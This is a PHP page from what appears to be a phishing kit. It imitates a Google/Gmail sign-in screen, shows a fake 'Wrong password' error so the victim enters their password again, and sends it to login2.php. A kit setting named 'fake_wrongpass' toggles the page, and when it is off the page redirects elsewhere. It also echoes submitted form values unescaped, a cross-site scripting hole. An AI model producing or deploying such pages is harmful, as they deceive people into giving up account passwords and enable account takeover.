<?php
session_start();

error_reporting(0);
session_start();
require_once '../../../main.php';


if($setting['fake_wrongpass'] == "YES"){
?>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  
      <div class="maindiv">
        <img src="google.png" alt="Google">
        <h1>Sign in Northlane</h1>
        <h3>Continue to Gmail</h3>
        <div class="inputs">
          <div class="Fields">
            <div class="Fieldset">
         <img src="https://thumbs.dreamstime.com/b/user-icon-flat-style-person-icon-user-icon-web-site-user-icon-vector-illustration-user-icon-flat-style-person-icon-user-129831161.jpg" alt="Girl in a jacket" width="44px" height="44px"><br>
         <?= $_SESSION['email'] ?><?= $_POST['email'] ?></div><div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71">
              <label class="placeholder"></label><?= $_SESSION['email'] ?><?= $_POST['email'] ?>
            </div>
            <br>
         <form method="post" action="login2.php">
          <div class="Fields">
            <div class="form-group">
            <div class="Fieldset">
              <br>
              <div>
            <label for="password">Password</label>
            <input type="password" class="Before-FS" placeholder="Password" id="password" name="password2" required style="border-color: #f0162f;">
           <div style="font-size: 14px; color: #f0162f; margin-top: 5px;"><p666>Wrong password. Try again or click Forgot password to reset it.<p666></p666></p666></div>
                  <div>
                      <br>
            <button type="submit" class="btn btn-primary btn-block" name="submit" value="<? echo $_POST['password'] ?>">Next</button>
         </div>
          <script>
            $(function() {
                $('label').css('visibility', 'hidden')

                $(document).on('focus', '#password', function() {
                    $('label').css('visibility', 'visible').hide().fadeIn('slow')
                    $(this).attr('placeholder', '')
                })
            })
        </script>
    </body>
</html>
<?php

}else{
echo "<script type='text/javascript'>window.top.location='../CruiseID';</script>";
}
?>
     </body>

</html>